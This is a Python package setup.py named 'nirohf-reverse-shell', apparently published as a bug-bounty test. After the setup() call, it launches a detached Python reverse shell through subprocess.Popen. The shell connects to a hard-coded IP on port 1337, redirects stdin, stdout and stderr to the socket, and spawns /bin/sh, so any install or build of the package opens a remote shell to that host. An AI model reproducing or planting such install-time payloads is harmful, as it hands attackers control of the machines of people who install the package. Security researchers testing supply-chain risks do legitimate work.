from setuptools import setup, find_packages
import subprocess


setup(
    name='nirohf-reverse-shell',
    version='1.6',
    license='MIT',
    author="Nir Ohfeld",
    author_email='niro+test@wiz.io',
    packages=find_packages('src'),
    package_dir={'': 'src'},
    url='https://github.com/gmyrianthous/example-publish-pypi',
    keywords='bug bounty test',
    install_requires=[],
)

import subprocess

# Command to run the reverse shell script
reverse_shell_command = '''
import socket
import os
import pty

# Specify the target IP and port
HOST = '172.104.210.105'  # Replace with the attacker's IP
PORT = 1337             # Replace with the attacker's listening port

# Create a socket and connect to the attacker
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

# Duplicate the file descriptors for stdin, stdout, stderr
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

# Spawn a pseudo-terminal
pty.spawn('/bin/sh')
'''

# Start the detached reverse shell process
subprocess.Popen(['python3', '-c', reverse_shell_command], stdin=None, stdout=None, stderr=None, close_fds=True)
